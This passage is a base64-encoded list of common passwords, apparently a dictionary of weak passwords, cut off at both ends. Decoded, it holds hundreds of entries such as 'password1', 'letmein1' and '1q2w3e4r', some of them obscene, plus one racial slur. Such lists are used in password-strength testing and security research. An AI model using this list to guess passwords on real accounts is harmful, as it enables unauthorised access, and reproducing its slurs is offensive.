zDQpyb3NlYnVkDQptZXRhbGxpYw0KZG9jdG9yDQp0cm91YmxlDQpzdWNjZXNzDQpzdHVwaWQNCnRvbWNhdA0Kd2Fycmlvcg0KcGVhY2hlcw0KYXBwbGVzDQpmaXNoDQpxd2VydHl1aQ0KbWFnaWMNCmJ1ZGR5DQpkb2xwaGlucw0KcmFpbmJvdw0KZ3VubmVyDQo5ODc2NTQNCmZyZWRkeQ0KYWxleGlzDQpicmF2ZXMNCmNvY2sNCjIxMTINCjEyMTINCmNvY2Fjb2xhDQp4YXZpZXINCmRvbHBoaW4NCnRlc3RpbmcNCmJvbmQwMDcNCm1lbWJlcg0KY2FsdmluDQp2b29kb28NCjc3NzcNCnNhbXNvbg0KYWxleA0KYXBvbGxvDQpmaXJlDQp0ZXN0ZXINCndhbHRlcg0KYmVhdmlzDQp2b3lhZ2VyDQpwZXRlcg0KcG9ybm8NCmJvbm5pZQ0KcnVzaDIxMTINCmJlZXINCmFwcGxlDQpzY29ycGlvDQpqb25hdGhhbg0Kc2tpcHB5DQpzeWRuZXkNCnNjb3R0DQpyZWQxMjMNCnBvd2VyDQpnb3Jkb24NCnRyYXZpcw0KYmVhdmVyDQpzdGFyDQpqYWNrYXNzDQpmbHllcnMNCmJvb2JzDQoyMzIzMjMNCnp6enp6eg0Kc3RldmUNCnJlYmVjY2ENCnNjb3JwaW9uDQpkb2dnaWUNCmxlZ2VuZA0Kb3U4MTINCnlhbmtlZQ0KYmxhemVyDQpiaWxsDQpydW5uZXINCmJpcmRpZQ0KYml0Y2hlcw0KNTU1NTU1DQpwYXJrZXINCnRvcGd1bg0KYXNkZmFzZGYNCmhlYXZlbg0KdmlwZXINCmFuaW1hbA0KMjIyMg0KYmlnYm95DQo0NDQ0DQphcnRodXINCmJhYnkNCnByaXZhdGUNCmdvZHppbGxhDQpkb25hbGQNCndpbGxpYW1zDQpsaWZlaGFjaw0KcGhhbnRvbQ0KZGF2ZQ0Kcm9jaw0KYXVndXN0DQpzYW1teQ0KY29vbA0KYnJpYW4NCnBsYXRpbnVtDQpqYWtlDQpicm9uY28NCnBhdWwNCm1hcmsNCmZyYW5rDQpoZWthNncyDQpjb3BwZXINCmJpbGx5DQpjdW1zaG90DQpnYXJmaWVsZA0Kd2lsbG93DQpjdW50DQpsaXR0bGUNCmNhcnRlcg0Kc2x1dA0KYWxiZXJ0DQo2OTY5Njk2OQ0Ka2l0dGVuDQpzdXBlcg0Kam9yZGFuMjMNCmVhZ2xlMQ0Kc2hlbGJ5DQphbWVyaWNhDQoxMTExMQ0KamVzc2llDQpob3VzZQ0KZnJlZQ0KMTIzMzIxDQpjaGV2eQ0KYnVsbHNoaXQNCndoaXRlDQpicm9uY29zDQpob3JuZXkNCnN1cmZlcg0Kbmlzc2FuDQo5OTk5OTkNCnNhdHVybg0KYWlyYm9ybmUNCmVsZXBoYW50DQptYXJ2aW4NCnNoaXQNCmFjdGlvbg0KYWRpZGFzDQpxd2VydA0Ka2V2aW4NCjEzMTMNCmV4cGxvcmVyDQp3YWxrZXINCnBvbGljZQ0KY2hyaXN0aW4NCmRlY2VtYmVyDQpiZW5qYW1pbg0Kd29sZg0Kc3dlZXQNCnRoZXJvY2sNCmtpbmcNCm9ubGluZQ0KZGlja2hlYWQNCmJyb29rbHluDQp0ZXJlc2ENCmNyaWNrZXQNCnNoYXJvbg0KZGV4dGVyDQpyYWNpbmcNCnBlbmlzDQpncmVnb3J5DQowMDAwDQp0ZWVucw0KcmVkd2luZ3MNCmRyZWFtcw0KbWljaGlnYW4NCmhlbnRhaQ0KbWFnbnVtDQo4NzY1NDMyMQ0Kbm90aGluZw0KZG9ua2V5DQp0cmluaXR5DQpkaWdpdGFsDQozMzMzMzMNCnN0ZWxsYQ0KY2FydG1hbg0KZ3Vpbm5lc3MNCjEyM2FiYw0Kc3BlZWR5DQpidWZmYWxvDQpraXR0eQ0KcGltcGluDQplYWdsZQ0KZWluc3RlaW4NCmtlbGx5DQpuZWxzb24NCm5pcnZhbmENCnZhbXBpcmUNCnh4eHgNCnBsYXlib3kNCmxvdWlzZQ0KcHVtcGtpbg0Kc25vd2JhbGwNCnRlc3QxMjMNCmdpcmwNCnN1Y2tlcg0KbWV4aWNvDQpiZWF0bGVzDQpmYW50YXN5DQpmb3JkDQpnaWJzb24NCmNlbHRpYw0KbWFyY3VzDQpjaGVycnkNCmNhc3NpZQ0KODg4ODg4DQpuYXRhc2hhDQpzbmlwZXINCmNoYW5jZQ0KZ2VuZXNpcw0KaG90cm9kDQpyZWRkb2cNCmFsZXhhbmRlDQpjb2xsZWdlDQpqZXN0ZXINCnBhc3N3MHJkDQpiaWdjb2NrDQpzbWl0aA0KbGFzdmVnYXMNCmNhcm1lbg0Kc2xpcGtub3QNCjMzMzMNCmRlYXRoDQpraW1iZXJseQ0KMXEydzNlDQplY2xpcHNlDQoxcTJ3M2U0cg0Kc3RhbmxleQ0Kc2FtdWVsDQpkcnVtbWVyDQpob21lcg0KbW9udGFuYQ0KbXVzaWMNCmFhYWENCnNwZW5jZXINCmppbW15DQpjYXJvbGluYQ0KY29sb3JhZG8NCmNyZWF0aXZlDQpoZWxsbzENCnJvY2t5DQpnb29iZXINCmZyaWRheQ0KYm9sbG9ja3MNCnNjb3R0eQ0KYWJjZGVmDQpidWJibGVzDQpoYXdhaWkNCmZsdWZmeQ0KbWluZQ0Kc3RlcGhlbg0KaG9yc2VzDQp0aHVtcGVyDQo1NTU1DQpwdXNzaWVzDQpkYXJrbmVzcw0KYXNkZmdoamsNCnBhbWVsYQ0KYm9vYmllcw0KYnVkZGhhDQp2YW5lc3NhDQpzYW5kbWFuDQpuYXVnaHR5DQpkb3VnbGFzDQpob25kYQ0KbWF0dA0KYXplcnR5DQo2NjY2DQpzaG9ydHkNCm1vbmV5MQ0KYmVhY2gNCmxvdmVtZQ0KNDMyMQ0Kc2ltcGxlDQpwb29oYmVhcg0KNDQ0NDQ0DQpiYWRhc3MNCmRlc3RpbnkNCnNhcmFoDQpkZW5pc2UNCnZpa2luZ3MNCmxpemFyZA0KbWVsYW5pZQ0KYXNzbWFuDQpzYWJyaW5hDQpuaW50ZW5kbw0Kd2F0ZXINCmdvb2QNCmhvd2FyZA0KdGltZQ0KMTIzcXdlDQpub3ZlbWJlcg0KeHh4eHgNCm9jdG9iZXINCmxlYXRoZXINCmJhc3RhcmQNCnlvdW5nDQoxMDEwMTANCmV4dHJlbWUNCmhhcmQNCnBhc3N3b3JkMQ0KdmluY2VudA0KcHVzc3kxDQpsYWNyb3NzZQ0KaG90bWFpbA0Kc3Bvb2t5DQphbWF0ZXVyDQphbGFza2ENCmJhZGdlcg0KcGFyYWRpc2UNCm1hcnlqYW5lDQpwb29wDQpjcmF6eQ0KbW96YXJ0DQp2aWRlbw0KcnVzc2VsbA0KdmFnaW5hDQpzcGl0ZmlyZQ0KYW5kZXJzb24NCm5vcm1hbg0KZXJpYw0KY2hlcm9rZWUNCmNvdWdhcg0KYmFyYmFyYQ0KbG9uZw0KNDIwNDIwDQpmYW1pbHkNCmhvcnNlDQplbmlnbWENCmFsbGlzb24NCnJhaWRlcg0KYnJhemlsDQpibG9uZGUNCmpvbmVzDQo1NTU1NQ0KZHVkZQ0KZHJvd3NzYXANCmplZmYNCnNjaG9vbA0KbWFyc2hhbGwNCmxvdmVseQ0KMXFhejJ3c3gNCmplZmZyZXkNCmNhcm9saW5lDQpmcmFua2xpbg0KYm9vdHkNCm1vbGx5DQpzbmlja2Vycw0KbGVzbGllDQpuaXBwbGVzDQpjb3VydG5leQ0KZGllc2VsDQpyb2Nrcw0KZW1pbmVtDQp3ZXN0c2lkZQ0Kc3V6dWtpDQpkYWRkeQ0KcGFzc2lvbg0KaHVtbWVyDQpsYWRpZXMNCnphY2hhcnkNCmZyYW5raWUNCmVsdmlzDQpyZWdnaWUNCmFscGhhDQpzdWNrbWUNCnNpbXBzb24NCnBhdHJpY2lhDQoxNDcxNDcNCnBpcmF0ZQ0KdG9tbXkNCnNlbXBlcmZpDQpqdXBpdGVyDQpyZWRydW0NCmZyZWV1c2VyDQp3YW5rZXINCnN0aW5reQ0KZHVjYXRpDQpwYXJpcw0KbmF0YWxpZQ0KYmFieWdpcmwNCmJpc2hvcA0Kd2luZG93cw0Kc3Bpcml0DQpwYW50ZXJhDQptb25kYXkNCnBhdGNoZXMNCmJydXR1cw0KaG91c3Rvbg0Kc21vb3RoDQpwZW5ndWluDQptYXJsZXkNCmZvcmVzdA0KY3JlYW0NCjIxMjEyMQ0KZmxhc2gNCm1heGltdXMNCm5pcHBsZQ0KYm9iYnkNCmJyYWRsZXkNCnZpc2lvbg0KcG9rZW1vbg0KY2hhbXBpb24NCmZpcmVtYW4NCmluZGlhbg0Kc29mdGJhbGwNCnBpY2FyZA0Kc3lzdGVtDQpjbGludG9uDQpjb2JyYQ0KZW5qb3kNCmx1Y2t5MQ0KY2xhaXJlDQpjbGF1ZGlhDQpib29naWUNCnRpbW90aHkNCm1hcmluZXMNCnNlY3VyaXR5DQpkaXJ0eQ0KYWRtaW4NCndpbGRjYXRzDQpwaW1wDQpkYW5jZXINCmhhcmRvbg0KdmVyb25pY2ENCmZ1Y2tlZA0KYWJjZDEyMzQNCmFiY2RlZmcNCmlyb25tYW4NCndvbHZlcmluDQpyZW1lbWJlcg0KZ3JlYXQNCmZyZWVwYXNzDQpiaWdyZWQNCnNxdWlydA0KanVzdGljZQ0KZnJhbmNpcw0KaG9iYmVzDQprZXJtaXQNCnBlYXJsamFtDQptZXJjdXJ5DQpkb21pbm8NCjk5OTkNCmRlbnZlcg0KYnJvb2tlDQpyYXNjYWwNCmhpdG1hbg0KbWlzdHJlc3MNCnNpbW9uDQp0b255DQpiYmJiYmINCmZyaWVuZA0KcGVla2Fib28NCm5ha2VkDQpidWRsaWdodA0KZWxlY3RyaWMNCnNsdXRzDQpzdGFyZ2F0ZQ0Kc2FpbnRzDQpib25kYWdlDQpicml0dGFueQ0KYmlnbWFuDQp6b21iaWUNCnN3aW1taW5nDQpkdWtlDQpxd2VydHkxDQpiYWJlcw0Kc2NvdGxhbmQNCmRpc25leQ0Kcm9vc3Rlcg0KYnJlbmRhDQptb29raWUNCnN3b3JkZmlzDQpjYW5keQ0KZHVuY2FuDQpvbGl2aWENCmh1bnRpbmcNCmJsaW5rMTgyDQphbGljaWENCjg4ODgNCnNhbXN1bmcNCmJ1YmJhMQ0Kd2hvcmUNCnZpcmdpbmlhDQpnZW5lcmFsDQpwYXNzcG9ydA0KYWFhYWFhYWENCmVyb3RpYw0KbGliZXJ0eQ0KYXJpem9uYQ0KamVzdXMNCmFiY2QNCm5ld3BvcnQNCnNraXBwZXINCnJvbGx0aWRlDQpiYWxscw0KaGFwcHkxDQpnYWxvcmUNCmNocmlzdA0Kd2Vhc2VsDQoyNDI0MjQNCndvbWJhdA0KZGlnZ2VyDQpjbGFzc2ljDQpidWxsZG9ncw0KcG9vcG9vDQphY2NvcmQNCnBvcGNvcm4NCnR1cmtleQ0KamVubnkNCmFtYmVyDQpidW5ueQ0KbW91c2UNCjAwNzAwNw0KdGl0YW5pYw0KbGl2ZXJwb29sDQpkcmVhbWVyDQpldmVydG9uDQpmcmllbmRzDQpjaGV2ZWxsZQ0KY2FycmllDQpnYWJyaWVsDQpwc3ljaG8NCm5lbWVzaXMNCmJ1cnRvbg0KcG9udGlhYw0KY29ubm9yDQplYXRtZQ0KbGlja21lDQpyb2xhbmQNCmN1bW1pbmcNCm1pdGNoZWxsDQppcmVsYW5kDQpsaW5jb2xuDQphcm5vbGQNCnNwaWRlcm1hDQpwYXRyaW90cw0KZ29ibHVlDQpkZXZpbHMNCmV1Z2VuZQ0KZW1waXJlDQphc2RmZw0KY2FyZGluYWwNCmJyb3duDQpzaGFnZ3kNCmZyb2dneQ0KcXdlcg0Ka2F3YXNha2kNCmtvZGlhaw0KcGVvcGxlDQpwaHBiYg0KbGlnaHQNCjU0MzIxDQprcmFtZXINCmNob3BwZXINCmhvb2tlcg0KaG9uZXkNCndoeW5vdA0KbGVzYmlhbg0KbGlzYQ0KYmF4dGVyDQphZGFtDQpzbmFrZQ0KdGVlbg0KbmNjMTcwMWQNCnFxcXFxcQ0KYWlycGxhbmUNCmJyaXRuZXkNCmF2YWxvbg0Kc2FuZHkNCnN1Z2FyDQpzdWJsaW1lDQpzdGV3YXJ0DQp3aWxkY2F0DQpyYXZlbg0Kc2NhcmZhY2UNCmVsaXphYmV0DQoxMjM2NTQNCnRydWNrcw0Kd29sZnBhY2sNCnBlcnZlcnQNCmxhd3JlbmNlDQpyYXltb25kDQpyZWRoZWFkDQphbWVyaWNhbg0KYWx5c3NhDQpiYW1iYW0NCm1vdmllDQp3b29keQ0Kc2hhdmVkDQpzbm93bWFuDQp0aWdlcjENCmNoaWNrcw0KcmFwdG9yDQoxOTY5DQpzdGluZ3JheQ0Kc2hvb3Rlcg0KZnJhbmNlDQpzdGFycw0KbWFkbWF4DQprcmlzdGVuDQpzcG9ydHMNCmplcnJ5DQo3ODk0NTYNCmdhcmNpYQ0Kc2ltcHNvbnMNCmxpZ2h0cw0Kcnlhbg0KbG9va2luZw0KY2hyb25pYw0KYWxpc29uDQpoYWhhaGENCnBhY2thcmQNCmhlbmRyaXgNCnBlcmZlY3QNCnNlcnZpY2UNCnNwcmluZw0Kc3Jpbml2YXMNCnNwaWtlDQprYXRpZQ0KMjUyNTI1DQpvc2Nhcg0KYnJvdGhlcg0KYmlnbWFjDQpzdWNrDQpzaW5nbGUNCmNhbm5vbg0KZ2VvcmdpYQ0KcG9wZXllDQp0YXR0b28NCnRleGFzDQpwYXJ0eQ0KYnVsbGV0DQp0YXVydXMNCnNhaWxvcg0Kd29sdmVzDQpwYW50aGVycw0KamFwYW4NCnN0cmlrZQ0KZmxvd2Vycw0KcHVzc3ljYXQNCmNocmlzMQ0KbG92ZXJib3kNCmJlcmxpbg0Kc3RpY2t5DQptYXJpbmENCnRhcmhlZWxzDQpmaXNoZXINCnJ1c3NpYQ0KY29ubmllDQp3b2xmZ2FuZw0KdGVzdHRlc3QNCm1hdHVyZQ0KYmFzcw0KY2F0Y2gyMg0KanVpY2UNCm1pY2hhZWwxDQpuaWdnZXINCjE1OTc1Mw0Kd29tZW4NCmFscGhhMQ0KdHJvb3Blcg0KaGF3a2V5ZQ0KaGVhZA0KZnJlYWt5DQpkb2RnZXJzDQpwYWtpc3Rhbg0KbWFjaGluZQ0KcHlyYW1pZA0KdmVnZXRhDQprYXRhbmENCm1vb3NlDQp0aW5rZXINCmNveW90ZQ0KaW5maW5pdHkNCmluc2lkZQ0KcGVwc2kNCmxldG1laW4xDQpiYW5nDQpjb250cm9sDQpoZXJjdWxlcw0KbW9ycmlzDQpqYW1lczENCnRpY2tsZQ0Kb3V0bGF3DQpicm93bnMNCmJpbGx5Ym9iDQpwaWNrbGUNCnRlc3QxDQptaWNoZWxlDQphbnRvbmlvDQpzdWNrcw0KcGF2aWxpb24NCmNoYW5nZW1lDQpjYWVzYXINCnByZWx1ZGUNCnRhbm5lcg0KYWRyaWFuDQpkYXJrc2lkZQ0KYm93bGluZw0Kd3V0YW5nDQpzdW5zZXQNCnJvYmJpZQ0KYWxhYmFtYQ0KZGFuZ2VyDQp6ZXBwZWxpbg0KanVhbg0KcnVzdHkNCnBwcHBwcA0Kbmljaw0KMjAwMQ0KcGluZw0KZGFya3N0YXINCm1hZG9ubmENCnF3ZTEyMw0KYmlnb25lDQpjYXNpbm8NCmNoZXJ5bA0KY2hhcmxpZTENCm1tbW1tbQ0KaW50ZWdyYQ0Kd3JhbmdsZXINCmFwYWNoZQ0KdHdlZXR5DQpxd2VydHkxMg0KYm9iYWZldHQNCnNpbW9uZQ0Kbm9uZQ0KYnVzaW5lc3MNCnN0ZXJsaW5nDQp0cmV2b3INCnRyYW5zYW0NCmR1c3Rpbg0KaGFydmV5DQplbmdsYW5kDQoyMzIzDQpzZWF0dGxlDQpzc3Nzc3MNCnJvc2UNCmhhcnJ5DQpvcGVudXANCnBhbmRvcmENCnB1c3N5cw0KdHJ1Y2tlcg0Kd2FsbGFjZQ0KaW5kaWdvDQpzdG9ybQ0KbWFsaWJ1DQp3ZWVkDQpyZXZpZXcNCmJhYnlkb2xsDQpkb2dneQ0KZGlsYmVydA0KcGVnYXN1cw0Kam9rZXINCmNhdGZpc2gNCmZsaXBwZXINCnZhbGVyaWUNCmhlcm1hbg0KZnVja2l0DQpkZXRyb2l0DQprZW5uZXRoDQpjaGV5ZW5uZQ0KYnJ1aW5zDQpzdGFjZXkNCnNtb2tlDQpqb2V5DQpzZXZlbg0KbWFyaW5vDQpmZXRpc2gNCnhmaWxlcw0Kd29uZGVyDQpzdGluZ2VyDQpwaXp6YQ0KYmFiZQ0KcHJldHR5DQpzdGVhbHRoDQptYW51dGQNCmdyYWNpZQ0KZ3VuZGFtDQpjZXNzbmENCmxvbmdob3JuDQpwcmVzYXJpbw0KbW5idmN4eg0Kd2lja2VkDQptdXN0YW5nMQ0KdmljdG9yeQ0KMjExMjIxMTINCnNoZWxseQ0KYXdlc29tZQ0KYXRoZW5hDQpxMXcyZTNyNA0KaGVscA0KaG9saWRheQ0Ka25pY2tzDQpzdHJlZXQNCnJlZG5lY2sNCjEyMzQxMjM0DQpjYXNleQ0KZ2l6bW8NCnNjdWxseQ0KZHJhZ29uMQ0KZGV2aWxkb2cNCnRyaXVtcGgNCmVkZGllDQpibHVlYmlyZA0Kc2hvdGd1bg0KcGVld2VlDQpyb25uaWUNCmFuZ2VsMQ0KZGFpc3kNCnNwZWNpYWwNCm1ldGFsbGljYQ0KbWFkbWFuDQpjb3VudHJ5DQppbXBhbGENCmxlbm5vbg0Kcm9zY29lDQpvbWVnYQ0KYWNjZXNzMTQNCmVudGVycHJpDQptaXJhbmRhDQpzZWFyY2gNCnNtaXR0eQ0KYmxpenphcmQNCnVuaWNvcm4NCnRpZ2h0DQpyaWNrDQpyb25hbGQNCmFzZGYxMjM0DQpoYXJyaXNvbg0KdHJpZ2dlcg0KdHJ1Y2sNCmRhbm55DQpob21lDQp3aW5uaWUNCmJlYXV0eQ0KdGhhaWxhbmQNCjEyMzQ1Njc4OTANCmNhZGlsbGFjDQpjYXN0bGUNCnR5bGVyDQpib2JjYXQNCmJ1ZGR5MQ0Kc3VubnkNCnN0b25lcw0KYXNpYW4NCmZyZWRkaWUNCmNodWNrDQpidXR0DQpsb3ZleW91DQpub3J0b24NCmhlbGxmaXJlDQpob3RzZXgNCmluZGlhbmENCnNob3J0DQpwYW56ZXINCmxvbmV3b2xmDQp0cnVtcGV0DQpjb2xvcnMNCmJsYXN0ZXINCjEyMTIxMjEyDQpmaXJlYmFsbA0KbG9nYW4NCnByZWNpb3VzDQphYXJvbg0KZWxhaW5lDQpqdW5nbGUNCmF0bGFudGENCmdvbGQNCmNvcm9uYQ0KY3VydGlzDQpuaWtraQ0KcG9sYXJpcw0KdGltYmVyDQp0aGVvbmUNCmJhbGxlcg0KY2hpcHBlcg0Kb3JsYW5kbw0KaXNsYW5kDQpza3lsaW5lDQpkcmFnb25zDQpkb2dzDQpiZW5zb24NCmxpY2tlcg0KZ29sZGllDQplbmdpbmVlcg0Ka29uZw0KcGVuY2lsDQpiYXNrZXRiYQ0Kb3Blbg0KaG9ybmV0DQp3b3JsZA0KbGluZGENCmJhcmJpZQ0KY2hhbg0KZmFybWVyDQp2YWxlbnRpbg0Kd2V0cHVzc3kNCmluZGlhbnMNCmxhcnJ5DQpyZWRtYW4NCmZvb2Jhcg0KdHJhdmVsDQptb3JwaGV1cw0KYmVybmllDQp0YXJnZXQNCjE0MTQxNA0KaG90c3R1ZmYNCnBob3Rvcw0KbGF1cmENCnNhdmFnZQ0KaG9sbHkNCnJvY2t5MQ0KZnVja19pbnNpZGUNCmRvbGxhcg0KdHVyYm8NCmRlc2lnbg0KbmV3dG9uDQpob3R0aWUNCm1vb24NCjIwMjAyMA0KYmxvbmRlcw0KNDEyOA0KbGVzdGF0DQphdmF0YXINCmZ1dHVyZQ0KZ29mb3JpdA0KcmFuZG9tDQphYmdydHl1DQpqampqamoNCmNhbmNlcg0KcTF3MmUzDQpzbWlsZXkNCmdvbGRiZXJnDQpleHByZXNzDQp2aXJnaW4NCnppcHBlcg0Kd3JpbmtsZTENCnN0b25lDQphbmR5DQpiYWJ5bG9uDQpkb25nDQpwb3dlcnMNCmNvbnN1bWVyDQpkdWRsZXkNCm1vbmtleTENCnNlcmVuaXR5DQpzYW11cmFpDQo5OTk5OTk5OQ0KYmlnYm9vYnMNCnNrZWV0ZXINCmxpbmRzYXkNCmpvZWpvZQ0KbWFzdGVyMQ0KYWFhYWENCmNob2NvbGF0DQpjaHJpc3RpYQ0KYmlydGhkYXkNCnN0ZXBoYW5pDQp0YW5nDQoxMjM0cXdlcg0KYWxmcmVkDQpiYWxsDQo5ODc2NTQzMg0KbWFyaWENCnNleHVhbA0KbWF4aW1hDQo3Nzc3Nzc3Nw0Kc2FtcHNvbg0KYnVja2V5ZQ0KaGlnaGxhbmQNCmtyaXN0aW4NCnNlbWlub2xlDQpyZWFwZXINCmJhc3NtYW4NCm51Z2dldA0KbHVjaWZlcg0KYWlyZm9yY2UNCm5hc3R5DQp3YXRzb24NCndhcmxvY2sNCjIxMjENCnBoaWxpcA0KYWx3YXlzDQpkb2RnZQ0KY2hyaXNzeQ0KYnVyZ2VyDQpiaXJkDQpzbmF0Y2gNCm1pc3N5DQpwaW5rDQpnYW5nDQptYWRkaWUNCmhvbG1lcw0KaHVza2Vycw0KcGlnbGV0DQpwaG90bw0Kam9hbm5lDQpoYW1pbHRvbg0KZG9kZ2VyDQpwYWxhZGluDQpjaHJpc3R5DQpjaHViYnkNCmJ1Y2tleWVzDQpoYW1sZXQNCmFiY2RlZmdoDQpiaWdmb290DQpzdW5kYXkNCm1hbnNvbg0KZ29sZGZpc2gNCmdhcmRlbg0KZGVmdG9uZXMNCmljZWNyZWFtDQpibG9uZGllDQpzcGFydGFuDQpqdWxpZQ0KaGFyb2xkDQpjaGFyZ2VyDQpicmFuZGkNCnN0b3JteQ0Kc2hlcnJ5DQpwbGVhc3VyZQ0KanV2ZW50dXMNCnJvZG5leQ0KZ2FsYXh5DQpob2xsYW5kDQplc2NvcnQNCnp4Y3ZiDQpwbGFuZXQNCmplcm9tZQ0Kd2VzbGV5DQpibHVlcw0Kc29uZw0KcGVhY2UNCmRhdmlkMQ0KbmNjMTcwMWUNCjE5NjYNCjUxNTA1MTUwDQpjYXZhbGllcg0KZ2FtYml0DQprYXJlbg0Kc2lkbmV5DQpyaXBwZXINCm9pY3U4MTINCmphbWllDQpzaXN0ZXINCm1hcmllDQptYXJ0aGENCm55bG9ucw0KYWFyZHZhcmsNCm5hZGluZQ0KbWlubmllDQp3aGlza2V5DQpiaW5nDQpwbGFzdGljDQphbmFsDQpiYWJ5bG9uNQ0KY2hhbmcNCnNhdmFubmFoDQpsb3Nlcg0KcmFjZWNhcg0KaW5zYW5lDQp5YW5rZWVzMQ0KbWVtZW1lDQpoYW5zb2xvDQpjaGllZnMNCmZyZWRmcmVkDQpmcmVhaw0KZnJvZw0Kc2FsbW9uDQpjb25jcmV0ZQ0KeXZvbm5lDQp6eGN2DQpzaGFtcm9jaw0KYXRsYW50aXMNCndhcnJlbg0Kd29yZHBhc3MNCmp1bGlhbg0KbWFyaWFoDQpyb21tZWwNCjEwMTANCmhhcnJpcw0KcHJlZGF0b3INCnN5bHZpYQ0KbWFzc2l2ZQ0KY2F0cw0Kc2FtbXkxDQptaXN0ZXINCnN0dWQNCm1hcmF0aG9uDQpydWJiZXINCmRpbmcNCnRydW5rcw0KZGVzaXJlDQptb250cmVhbA0KanVzdG1lDQpmYXN0ZXINCmthdGhsZWVuDQppcmlzaA0KMTk5OQ0KYmVydGhhDQpqZXNzaWNhMQ0KYWxwaW5lDQpzYW1taWUNCmRpYW1vbmRzDQp0cmlzdGFuDQowMDAwMA0Kc3dpbmdlcg0Kc2hhbg0Kc3RhbGxpb24NCnBpdGJ1bGwNCmxldG1laW4yDQpyb2JlcnRvDQpyZWFkeQ0KYXByaWwNCnBhbG1lcg0KbWluZw0Kc2hhZG93MQ0KYXVkcmV5DQpjaG9uZw0KY2xpdG9yaXMNCndhbmcNCnNoaXJsZXkNCmZ1Y2tlcnMNCmphY2tvZmYNCmJsdWVza3kNCnN1bmRhbmNlDQpyZW5lZ2FkZQ0KaG9sbHl3b28NCjE1MTUxNQ0KYmVybmFyZA0Kd29sZm1hbg0Kc29sZGllcg0KcGljdHVyZQ0KcGllcnJlDQpsaW5nDQpnb2RkZXNzDQptYW5hZ2VyDQpuaWtpdGENCnN3ZWV0eQ0KdGl0YW5zDQpoYW5nDQpmYW5nDQpmaWNrZW4NCm5pbmVycw0KYm90dG9tDQpidWJibGUNCmhlbGxvMTIzDQppYmFuZXoNCndlYnN0ZXINCnN3ZWV0cGVhDQpzdG9ja2luZw0KMzIzMjMyDQp0b3JuYWRvDQpsaW5kc2V5DQpjb250ZW50DQpicnVjZQ0KYnVjaw0KYXJhZ29ybg0KZ3JpZmZpbg0KY2hlbg0KY2FtcGJlbGwNCnRyb2phbg0KY2hyaXN0b3ANCm5ld21hbg0Kd2F5bmUNCnRpbmENCnJvY2tzdGFyDQpmYXRoZXINCmdlcm9uaW1vDQpwYXNjYWwNCmNyaW1zb24NCmJyb29rcw0KaGVjdG9yDQpwZW5ueQ0KYW5uYQ0KZ29vZ2xlDQpjYW1lcmENCmNoYW5kbGVyDQpmYXRjYXQNCmxvdmVsb3ZlDQpjb2R5DQpjdW50cw0Kd2F0ZXJzDQpzdGltcHkNCmZpbmdlcg0KY2luZHkNCndoZWVscw0KdmlwZXIxDQpsYXRpbg0Kcm9iaW4NCmdyZWVuZGF5DQo5ODc2NTQzMjENCmNyZWFtcGllDQpicmVuZGFuDQpoaXBob3ANCndpbGx5DQpzbmFwcGVyDQpmdW50aW1lDQpkdWNrDQp0cm9tYm9uZQ0KYWR1bHQNCmNvdHRvbg0KY29va2llcw0Ka2Fpc2VyDQptdWxkZXINCndlc3RoYW0NCmxhdGlubw0KamVlcA0KcmF2ZW5zDQphdXJvcmENCmRyaXp6dA0KbWFkbmVzcw0KZW5lcmd5DQpraW5reQ0KMzE0MTU5DQpzb3BoaWENCnN0ZWZhbg0Kc2xpY2sNCnJvY2tlcg0KNTU1NTU1NTUNCmZyZWVtYW4NCmZyZW5jaA0KbW9uZ29vc2UNCnNwZWVkDQpkZGRkZGQNCmhvbmcNCmhlbnJ5DQpodW5ncnkNCnlhbmcNCmNhdGRvZw0KY2hlbmcNCmdob3N0DQpnb2dvZ28NCnJhbmR5DQp0b3R0ZW5oYQ0KY3VyaW91cw0KYnV0dGVyZmwNCm1pc3Npb24NCmphbnVhcnkNCnNpbmdlcg0Kc2hlcm1hbg0Kc2hhcmsNCnRlY2hubw0KbGFuY2VyDQpsYWxhbGENCmF1dHVtbg0KY2hpY2hpDQpvcmlvbg0KdHJpeGllDQpjbGlmZm9yZA0KZGVsdGENCmJvYmJvYg0KYm9tYmVyDQpob2xkZW4NCmthbmcNCmtpc3MNCjE5NjgNCnNwdW5reQ0KbGlxdWlkDQptYXJ5DQpiZWFnbGUNCmdyYW5ueQ0KbmV0d29yaw0KYm9uZA0Ka2tra2trDQptaWxsaWUNCjE5NzMNCmJpZ2dpZQ0KYmVldGxlDQp0ZWFjaGVyDQpzdXNhbg0KdG9yb250bw0KYW5ha2luDQpnZW5pdXMNCmRyZWFtDQpjb2Nrcw0KZGFuZw0KYnVzaA0Ka2FyYXRlDQpzbmFrZXMNCmJhbmdrb2sNCmNhbGxpZQ0KZnVja3lvdTINCnBhY2lmaWMNCmRheXRvbmENCmtlbHNleQ0KaW5mYW50cnkNCnNreXdhbGtlDQpmb3N0ZXINCmZlbGl4DQpzYWlsaW5nDQpyYWlzdGxpbg0KdmFuaGFsZW4NCmh1YW5nDQpoZXJiZXJ0DQpqYWNvYg0KYmxhY2tpZQ0KdGFyemFuDQpzdHJpZGVyDQpzaGVybG9jaw0KbGFuZw0KZ29uZw0Kc2FuZw0KZGlldGNva2UNCnVsdGltYXRlDQp0cmVlDQpzaGFpDQpzcHJpdGUNCnRpbmcNCmFydGlzdA0KY2hhaQ0KY2hhbw0KZGV2aWwNCnB5dGhvbg0KbmluamENCm1pc3R5DQp5dHJld3ENCnN3ZWV0aWUNCnN1cGVyZmx5DQo0NTY3ODkNCnRpYW4NCmppbmcNCmplc3VzMQ0KZnJlZWRvbTENCmRpYW4NCmRycGVwcGVyDQpwb3R0ZXINCmNob3UNCmRhcnJlbg0KaG9iYml0DQp2aW9sZXQNCnlvbmcNCnNoZW4NCnBoaWxsaXANCm1hdXJpY2UNCmdsb3JpYQ0Kbm9saW1pdA0KbXlsb3ZlDQpiaXNjdWl0DQp5YWhvbw0Kc2hhc3RhDQpzZXg0bWUNCnNtb2tlcg0Kc21pbGUNCnBlYmJsZXMNCnBpY3MNCnBoaWxseQ0KdG9uZw0KdGludGluDQpsZXNiaWFucw0KbWFybGluDQpjYWN0dXMNCmZyYW5rMQ0KdHR0dHR0DQpjaHVuDQpkYW5uaQ0KZW1lcmFsZA0Kc2hvd21lDQpwaXJhdGVzDQpsaWFuDQpkb2dnDQpjb2xsZWVuDQp4aWFvDQp4aWFuDQp0YXptYW4NCnRhbmtlcg0KcGF0dG9uDQp0b3NoaWJhDQpyaWNoaWUNCmFsYmVydG8NCmdvdGNoYQ0KZ3JhaGFtDQpkaWxsb24NCnJhbmcNCmVtaWx5DQprZW5nDQpqYXp6DQpiaWdndXkNCnl1YW4NCndvbWFuDQp0b210b20NCm1hcmlvbg0KZ3JlZw0KY2hhb3MNCmZvc3NpbA0KZmxpZ2h0DQp